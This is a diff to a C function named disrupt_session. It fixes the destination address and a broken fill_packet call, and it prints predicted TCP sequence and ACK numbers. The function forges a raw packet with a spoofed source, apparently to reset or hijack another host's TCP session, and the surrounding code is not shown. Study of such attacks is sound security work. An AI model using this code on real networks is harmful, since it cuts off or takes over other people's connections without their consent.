@@ -127,6 +127,9 @@ void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, u
         seq_inc = sequenceNumber - prevSeq;
     }
 
+    printf("New Sequence Number: %u", sequenceNumber + seq_inc);
+    printf("New ACK: %u", ackNumber + ack_inc);
+
     //Raw socket without any protocol-header inside
     if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
         perror("Error while creating socket");
@@ -141,21 +144,21 @@ void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, u
 
     //Populate address struct
     addr_in.sin_family = AF_INET;
-    addr_in.sin_port = htons(atoi(serverPort));
-    addr_in.sin_addr.s_addr = inet_addr(serverIP);
+    addr_in.sin_port = htons(destinationPort);
+    addr_in.sin_addr.s_addr = inet_addr(destinationIP);
 
-    void fill_packet(sourceIP,
-                     destinationIP,
-                     destinationPort,
-                     sourcePort,
-                     0,
-                     1,
-                     sequenceNumber + seq_inc,
-                     ackNumber + ack_inc,
-                     1,
-                     '\0',
-                     packet,
-                     65536);
+    fill_packet(sourceIP,
+                destinationIP,
+                destinationPort,
+                sourcePort,
+                0,
+                1,
+                sequenceNumber + seq_inc,
+                ackNumber + ack_inc,
+                1,
+                '\0',
+                packet,
+                65536);
 
     // Send out the packet
     send_packet(sock, packet, addr_in);
